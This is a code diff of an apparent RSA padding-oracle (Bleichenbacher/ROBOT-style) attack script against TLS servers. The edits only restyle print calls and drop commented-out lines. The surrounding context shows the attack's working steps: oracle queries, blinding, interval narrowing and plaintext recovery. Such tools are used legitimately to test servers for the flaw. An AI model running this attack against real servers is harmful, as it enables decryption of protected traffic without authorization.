@@ -137,7 +137,7 @@ def BleichenbacherOracle(cc):
     global countvalid
     count = count + 1
     if count % 1000 == 0:
-        print (count, "oracle queries")
+        print(count, "oracle queries")
     tmp = hex(cc).rstrip("L").lstrip("0x").rjust(modulus_bits // 4, '0')
     pms = bytearray.fromhex(tmp)
     o = oracle(pms, messageflow=flow)
@@ -204,7 +204,7 @@ modulus_bytes = (modulus_bits + 7) // 8
 if not args.quiet:
     print("RSA N: %s" % hex(N))
     print("RSA e: %s" % hex(e))
-    print ("Modulus size: %i bits, %i bytes" % (modulus_bits, modulus_bytes))
+    print("Modulus size: %i bits, %i bytes" % (modulus_bits, modulus_bytes))
 
 cke_2nd_prefix = bytearray.fromhex("{0:0{1}x}".format(modulus_bytes + 6, 4) + "10" + "{0:0{1}x}".format(modulus_bytes + 2, 6) + "{0:0{1}x}".format(modulus_bytes, 4))
 # pad_len is length in hex chars, so bytelen * 2
@@ -277,7 +277,7 @@ if (oracle_good != oracle_good_verify) or (oracle_bad1 != oracle_bad_verify1) or
 if (oracle_bad1 == oracle_bad2 == oracle_bad3):
     oracle_strength = "weak"
     if not args.quiet:
-        print ("The oracle is weak, the attack would take too long")
+        print("The oracle is weak, the attack would take too long")
 else:
     oracle_strength = "strong"
     if not args.quiet:
@@ -345,14 +345,14 @@ s0 = int(args.s0)
 limit = int(args.limit)
 c0 = C
 # Step 1: Blinding
-print ("Searching for the first valid ciphertext starting %i" % s0)
+print("Searching for the first valid ciphertext starting %i" % s0)
 if (EXECUTE_BLINDING):
     while not BleichenbacherOracle(c0):
         s0 = s0 + 1
         c0 = (int(gmpy2.powmod(s0, e, N)) * C) % N
         if (limit != -1) and s0 > limit:
             quit()
-    print (" -> Found s0: ", s0)
+    print(" -> Found s0: ", s0)
 
 
 M = set()
@@ -431,31 +431,29 @@ while True:
         if not intervalsize == previntervalsize:
             previntervalsize = intervalsize
             print(count, "oracle queries, Interval size:", intervalsize, "bit.")
-#                        print ("min: " , hex(a))
-#                        print ("max: " , hex(b))
         if intervalsize < 10:
             break
 
     i += 1
 
 print
-print ("Starting exhaustive search on remaining interval")
+print("Starting exhaustive search on remaining interval")
 
-print ("min: ", hex(a))
-print ("max: ", hex(b))
+print("min: ", hex(a))
+print("max: ", hex(b))
 
 while not c0 == int(gmpy2.powmod(a, e, N)):
     a += 1
 
-print ("C:      ", hex(C))
-print ("result: ", hex(a))
+print("C:      ", hex(C))
+print("result: ", hex(a))
 
 if s0 != 1:
     x = int(gmpy2.invert(s0, N))
     res = (x * a) % N
-    print ("result after unblinding: ", hex(res))
+    print("result after unblinding: ", hex(res))
 
 stoptime = time.time()
-print ("Time elapsed:", stoptime - starttime, "seconds (=", (stoptime - starttime) / 60, "minutes)")
-print ("Modulus size:", int(math.ceil(math.log(N, 2))), "bit. About", (stoptime - starttime) / math.ceil(math.log(N, 2)), "seconds per bit.")
-print (count, "oracle queries performed,", countvalid, "valid ciphertexts.")
+print("Time elapsed:", stoptime - starttime, "seconds (=", (stoptime - starttime) / 60, "minutes)")
+print("Modulus size:", int(math.ceil(math.log(N, 2))), "bit. About", (stoptime - starttime) / math.ceil(math.log(N, 2)), "seconds per bit.")
+print(count, "oracle queries performed,", countvalid, "valid ciphertexts.")
